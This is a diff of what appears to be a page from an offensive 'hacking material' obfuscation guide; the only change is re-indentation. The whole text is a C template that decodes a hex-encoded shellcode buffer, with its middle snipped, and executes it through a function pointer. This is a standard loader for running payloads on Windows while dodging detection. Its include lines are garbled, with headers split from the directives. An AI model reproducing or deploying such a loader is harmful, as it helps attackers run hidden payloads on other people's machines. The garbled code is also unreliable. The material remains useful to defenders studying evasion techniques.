@@ -51,54 +51,56 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 - template C
 
       #include
-#include
-#include
-#include
-#include
-#include
-#include
-<stdio.h>
-<stdlib.h>
-<unistd.h>
-<string.h>
-<windows.h>
-<tchar.h>
-<stdlib.h>
-void exec_shellcode(unsigned char *shellcode)
-{
-int (*funct)();
-funct = (int (*)()) shellcode;
-(int)(*funct)();
-}
-// return pointer to shellcode
-unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
-{
-int j=0;
-shellcode=malloc((size/2));
-int i=0;
-do
-{
-unsigned char temp[3]={0};
-sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
-shellcode[j] = strtoul(temp, NULL, 16);
-i+=2;
-j++;
-} while(i<size);
-return shellcode;
-}
-int main (int argc, char **argv)
-{
-unsigned char *shellcode;
-unsigned char buffer[]=
-“fce8890000006089e531d2648b5230”
-“8b520c8b52148b72280fb74a2631ff”
-... SNIP ...
-“b5a25668a695bd9dffd53c067c0a80”
-“fbe07505bb4713726f6a0053ffd5”;
-int size = sizeof(buffer);
-shellcode = decode_shellcode(buffer,shellcode,size);
-exec_shellcode(shellcode);
-}
+      #include
+      #include
+      #include
+      #include
+      #include
+      #include
+      <stdio.h>
+      <stdlib.h>
+      <unistd.h>
+      <string.h>
+      <windows.h>
+      <tchar.h>
+      <stdlib.h>
+
+      void exec_shellcode(unsigned char *shellcode)
+      {
+      int (*funct)();
+      funct = (int (*)()) shellcode;
+      (int)(*funct)();
+      }
+
+      // return pointer to shellcode
+      unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
+      {
+      int j=0;
+      shellcode=malloc((size/2));
+      int i=0;
+      do
+      {
+      unsigned char temp[3]={0};
+      sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
+      shellcode[j] = strtoul(temp, NULL, 16);
+      i+=2;
+      j++;
+      } while(i<size);
+      return shellcode;
+      }
+      int main (int argc, char **argv)
+      {
+      unsigned char *shellcode;
+      unsigned char buffer[]=
+      “fce8890000006089e531d2648b5230”
+      “8b520c8b52148b72280fb74a2631ff”
+      ... SNIP ...
+      “b5a25668a695bd9dffd53c067c0a80”
+      “fbe07505bb4713726f6a0053ffd5”;
+      int size = sizeof(buffer);
+      shellcode = decode_shellcode(buffer,shellcode,size);
+      exec_shellcode(shellcode);
+      }
 
 
 
